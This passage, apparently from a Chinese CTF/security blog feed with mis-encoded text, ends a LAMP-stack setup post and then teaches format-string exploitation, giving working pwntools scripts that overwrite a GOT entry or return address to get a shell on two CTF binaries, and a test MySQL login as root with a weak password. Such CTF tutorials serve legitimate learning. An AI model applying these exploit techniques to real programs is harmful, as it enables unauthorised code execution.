class="hljs-attribute">--with-pdo-mysql</span>=/usr/local/mysql --without-pear</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# make</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# make install</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# mkdir /usr/local/php/etc[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre></div><p>å¤åˆ¶ä¸»é…ç½®æ–‡ä»¶åˆ°<code>/usr/local/php/etc</code></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# vi /usr/local/apache2/etc/httpd.conf</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" alt><br>ä¿®æ”¹apache2é…ç½®ï¼Œè®©å…¶ä¹Ÿå¯ä»¥æ”¯æŒphp</p><p>é‡å¯apache2:</p><div class="hljs"><pre><code class="hljs undefined">[root@localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# /usr/<span class="hljs-keyword">local</span>/apache2/bin/apachectl stopAH00558: httpd: Could <span class="hljs-keyword">not</span> reliably determine the <span class="hljs-keyword">server</span><span class="hljs-string">'s fully qualified domain name, using localhost.localdomain. Set the '</span>ServerNam<span class="hljs-string">e' directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server'</span>s fully qualified <span class="hljs-keyword">domain</span> <span class="hljs-type">name</span>, <span class="hljs-keyword">using</span> localhost.localdomain. <span class="hljs-keyword">Set</span> the <span class="hljs-string">'ServerName'</span> directive globally <span class="hljs-keyword">to</span> suppress this message</code></pre></div><p>restart å¯èƒ½æ˜¯æ— æ•ˆçš„ã€‚</p><h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><h4 id="apacheä¸php"><a href="#apacheä¸php" class="headerlink" title="apacheä¸php"></a>apacheä¸php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> htdocs]<span class="hljs-meta"># vi index.php</span></code></pre></div><p>å†™ä¸€ä¸ªphpæ¢é’ˆï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>        phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apacheä¸MySQL"><a href="#apacheä¸MySQL" class="headerlink" title="apacheä¸MySQL"></a>apacheä¸MySQL</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$link=mysql_connect(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'123456'</span>);<span class="hljs-keyword">if</span>($link) <span class="hljs-keyword">echo</span> <span class="hljs-string">"Congratulations!!!!!!"</span>;mysql_close();<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadminæ­å»º"><a href="#phpadminæ­å»º" class="headerlink" title="phpadminæ­å»º"></a>phpadminæ­å»º</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost lamp1]# cp -r phpMyAdmin<span class="hljs-number">-4.1</span><span class="hljs-number">.4</span>-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre></div><h4 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-attr">[root@localhost phpmyadmin]</span># <span class="hljs-selector-tag">cp</span> <span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.sample</span><span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span> <span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-attr">[root@localhost phpmyadmin]</span># <span class="hljs-selector-tag">vi</span> <span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>è®¿é—®æµ‹è¯•ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰</title>
    <link href="/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥ç€ä¸Šä¸€ç¯‡ï¼Œè¿™ä¸€ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹å¯¹äºè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å’Œctfèµ›é¢˜ä¸­å¸¸è§çš„å¥—è·¯å’Œè€ƒæ³•ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š</h2><h3 id="åŠ«æŒgot"><a href="#åŠ«æŒgot" class="headerlink" title="åŠ«æŒgot"></a>åŠ«æŒgot</h3><ul><li>æ¯æ¬¡ call libc ä¸­çš„å‡½æ•°æ—¶éƒ½ä¼šå»GOTè¡¨ä¸­æŸ¥è¯¢æ¥æ‰¾å‡ºç¨‹åºä¸‹ä¸€æ­¥è¦jmpçš„ä½å€</li><li>å¯ä»¥é€šè¿‡ fmt æ„é€ å†™å…¥ä¸€ä¸ªç›®æ ‡åœ°å€ï¼Œæ”¹æ‰ GOT è¡¨ä¸Šçš„åœ°å€ä½¿å¾—callè¯¥å‡½æ•°æ—¶å˜æˆjmpåˆ°æˆ‘ä»¬è¦çš„ç›®æ ‡åœ°å€å»<br>ä¾‹å¦‚ ï¼š<br>å°† printf æ”¹æˆ systemï¼ŒåŸæœ¬ printf (â€œshâ€™â€™ï¼‰å°±ç›´æ¥å˜æˆ system (â€œshâ€),ä¾¿å¯ä»¥æ‹¿åˆ°shellã€‚<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>è¿™ä¸€æ”»å‡»è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</li><li>ç¡®å®šä¸€ä¸‹printfå‡½æ•°çš„GOTè¡¨çš„åœ°å€ï¼Œå¦‚å›¾ä¸­æ˜¯<code>0x804a010</code></li><li>ç¡®å®šä¸€ä¸‹systemå‡½æ•°çš„å†…å­˜åœ°å€æˆ–è€…pltï¼ˆé€šå¸¸éƒ½éœ€è¦æ³„æ¼ä¸€ä¸‹libcçš„åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Šåç§»ç®—å‡ºï¼Œå½“ç„¶ä¹Ÿä¼šé‡åˆ°ç¨‹åºç›´æ¥å­˜åœ¨systemå‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯pltï¼‰</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfå‡½æ•°GOTè¡¨çš„åœ°å€</li><li>åˆ©ç”¨fmtæ¼æ´ä¿®æ”¹printfå‡½æ•°GOTè¡¨ä¸Šçš„åœ°å€</li></ul><p>ç„¶åçœ‹ä¸€ä¸ªä¾‹é¢˜ï¼š</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h5 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __cdecl __<span class="hljs-function">noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-10Ch]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-keyword">do</span>  &#123;    fgets(&amp;s, <span class="hljs-number">256</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-built_in">printf</span>(&amp;s);  &#125;  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(&amp;s, <span class="hljs-string">"exit\n"</span>) );  system(<span class="hljs-string">"echo Goodbye"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œé‚£å°±æ„å‘³ç€å¯ä»¥æ— é™æ¬¡è§¦å‘è¿™ä¸ªæ¼æ´ã€‚å¹¶ä¸”è¿˜æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œé‚£å¯ä»¥ç›´æ¥æ‰¾å…¶pltã€‚</p><h6 id="æ”»å‡»æ€è·¯ï¼š"><a href="#æ”»å‡»æ€è·¯ï¼š" class="headerlink" title="æ”»å‡»æ€è·¯ï¼š"></a>æ”»å‡»æ€è·¯ï¼š</h6><ul><li>åœ¨æ ˆä¸Šæ”¾å¥½printfå‡½æ•°çš„GOTè¡¨åœ°å€ï¼Œå¹¶ç¡®å®šä¸€ä¸‹åç§»</li><li>æ”¹è¿™ä¸ªGOTä¸Šçš„åœ°å€ä¸ºsystemå‡½æ•°çš„plt</li><li>æ”¹å¥½ä¸€ä¼šï¼Œä¼ é€ä¸€ä¸ª<code>/bin/sh</code>ï¼Œæ­¤æ—¶å°±ä¼šå˜æˆ<code>system(/bin/sh)</code></li></ul><p>åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæ”¹GOTè¡¨ä¸Šçš„å€¼<strong>è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥</strong>ï¼Œå¦åˆ™åªæ”¹ä¸€èˆ¬ç¨‹åºä¼šå‡ºç°æ— æ³•é¢„æ–™çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹<strong>å­—èŠ‚å¯¹é½</strong>ã€‚</p><h5 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ stack <span class="hljs-number">0x20</span><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd250</span> --&gt; <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd254</span> --&gt; <span class="hljs-number">0x100</span><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd258</span> --&gt; <span class="hljs-number">0xf7fb25a0</span> --&gt; <span class="hljs-number">0xfbad208b</span><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd25c</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd260</span> --&gt; <span class="hljs-number">0xf7ffd000</span> --&gt; <span class="hljs-number">0x23f40</span><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd264</span> --&gt; <span class="hljs-number">0x80482e7</span> (<span class="hljs-string">"__libc_start_main"</span>)<span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd268</span> --&gt; <span class="hljs-number">0xf63d4e2e</span><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)</code></pre></div><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ fmtarg <span class="hljs-number">0xffffd26c</span>The <span class="hljs-keyword">index</span> of <span class="hljs-keyword">format</span> argument : <span class="hljs-number">7</span> (<span class="hljs-string">"\%6$p"</span>)</code></pre></div><p>ç¡®å®šåç§»æ˜¯7ï¼Œä½†éœ€è¦æ³¨æ„å­—èŠ‚å¯¹é½ï¼Œæ‰“ç®—ä¸€ä¼šåœ¨å†™payloadæ—¶å€™ï¼Œå°±<code>().ljust</code>è¡¥æˆ0x20çš„<code>a</code>ï¼Œä¹Ÿå°±æ˜¯<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x08048400</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">15</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) + p32(printf_got) + p32(printf_got+<span class="hljs-number">2</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><p>æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsä¸­é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æ¨¡å—ä¸­çš„å‡½æ•°<code>fmtstr_payload</code>ï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span>payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;printf_got : system_plt&#125;)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚ï¼ˆä¸è¿‡å¬è¯´pwntoolsçš„æ–°ç‰ˆæœ¬æ˜¯å·²ç»æ”¯æŒ64ä½äº†ï¼Œä½†æ˜¯æœ¬äººä¸€ç›´æ²¡æœ‰æ›´æ–°æˆåŠŸï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æµ‹è¯•ï¼‰</p><h3 id="åŠ«æŒretaddress"><a href="#åŠ«æŒretaddress" class="headerlink" title="åŠ«æŒretaddress"></a>åŠ«æŒretaddress</h3><p>é¡¾åæ€è®®ï¼Œå°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–ä¸²æ¼æ´æ¥ä¿®æ”¹å‡½æ•°çš„è¿”å›åœ°å€åˆ°æˆ‘ä»¬æƒ³è¦jmpçš„åœ°å€ã€‚å¸¸è§å¥—è·¯ï¼š</p><ul><li>jmpåˆ°å¸¦æœ‰<code>system(/bin/sh)</code> çš„åé—¨å‡½æ•°</li><li>ä¸å¼€nxä¿æŠ¤ï¼Œjmpåˆ°è‡ªå·±æ„é€ çš„shellcodeä¸Šã€‚</li><li>æå‰æ³„æ¼libcç®—å‡ºlibcçš„baseï¼Œjmpåˆ°onegadgetåœ°å€</li></ul><p>çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><h4 id="ä¸‰ä¸ªç™½å¸½-pwnme-k0"><a href="#ä¸‰ä¸ªç™½å¸½-pwnme-k0" class="headerlink" title="ä¸‰ä¸ªç™½å¸½ - pwnme-k0"></a>ä¸‰ä¸ªç™½å¸½ - pwnme-k0</h4><h5 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>64ä½ç¨‹åºï¼Œä¸”å¼€å¯äº†RELROä¿æŠ¤ï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotè¡¨äº†ã€‚</p><h5 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><p>è¿™ä¸ªç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºç¨‹åºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">sub_400B07</span><span class="hljs-params">(<span class="hljs-keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="hljs-keyword">char</span> formata, __int64 a8, __int64 a9)</span></span>&#123;  write(<span class="hljs-number">0</span>, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>, <span class="hljs-number">0x1A</span>uLL);  <span class="hljs-built_in">printf</span>(&amp;formata, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;a9 + <span class="hljs-number">4</span>);&#125;</code></pre></div><p>å¹¶ä¸”å‘ç°å…¶ä¸­è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>ä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œé‚£æ”»å‡»æ€è·¯ä¹Ÿå°±æ˜¯å»ä¿®æ”¹ç¨‹åºä¸­æŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚</p><h5 id="gdbè°ƒè¯•ï¼š"><a href="#gdbè°ƒè¯•ï¼š" class="headerlink" title="gdbè°ƒè¯•ï¼š"></a>gdbè°ƒè¯•ï¼š</h5><p>å®šä½åˆ°è¿™ä¸ªå­˜åœ¨æ¼æ´çš„printfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œå¹¶ä¸”rdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚</p><p>ç„¶åå‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¨‹åºç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œå‘ç°è¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ã€‚æ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºå­˜æ”¾ret addressçš„æ ˆåœ°å€ã€‚</p><p>ç„¶åè®©ç¨‹åºè¿è¡Œåˆ°ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯çš„å‡½æ•°ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¯ä»¥å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./pwnme_k0'</span>)<span class="hljs-comment"># context.clear(arch = 'amd64')</span>io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'%0006$lx'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'11111111'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)<span class="hljs-comment"># io.recvuntil('Welc0me to sangebaimao!\n')</span>stack = int(io.recvline_contains(<span class="hljs-string">'7f'</span>),<span class="hljs-number">16</span>)print(stack)ret_add = stack - <span class="hljs-number">0x38</span><span class="hljs-comment"># system_add = 0x04008AA</span>payload = <span class="hljs-string">'%2218c%8$hn'</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'2'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(p64(ret_add))io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)io.interactive()</code></pre></div><h3 id="ä¿®æ”¹FINI-ARRAYåŒº"><a href="#ä¿®æ”¹FINI-ARRAYåŒº" class="headerlink" title="ä¿®æ”¹FINI_ARRAYåŒº"></a>ä¿®æ”¹<code>FINI_ARRAY</code>åŒº</h3><p>åœ¨ä¸Šé¢çš„ä¸¤ä¸ªä¾‹å­ä¸­å¯ä»¥å‘ç°,ä¹‹æ‰€ä»¥èƒ½æˆåŠŸåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´getshell,å¾ˆå¤šæ—¶å€™éƒ½æ˜¯å› ä¸ºç¨‹åºä¸­å­˜åœ¨å¾ªç¯ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¤šæ¬¡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚å¦‚æœç¨‹åºä¸­ä¸å­˜åœ¨å¾ªç¯å‘¢?åˆ©ç”¨ROPåŠ«æŒå‡½æ•°è¿”å›åœ°å€åˆ°startå¯ä»¥å®ç°ï¼›å½“å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œä½¿ç”¨è¿™ä¸ªæ¼æ´ä¹Ÿåšåˆ°è¿™ä¸€<br>ç‚¹ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>ç®€å•åœ°è¯´,ä¸€ä¸ªç¨‹åºåœ¨è°ƒç”¨ mainå‡½æ•°å‰ä¼šè°ƒç”¨<code>.init</code>æ®µä»£ç å’Œ <code>.init_array</code> æ®µçš„å‡½æ•°æ•°ç»„ä¸­æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚åŒæ ·çš„,main å‡½æ•°ç»“æŸåä¹Ÿä¼šè°ƒç”¨<code>.fini</code>æ®µä»£ç å’Œ <code>.fini_arrary</code> 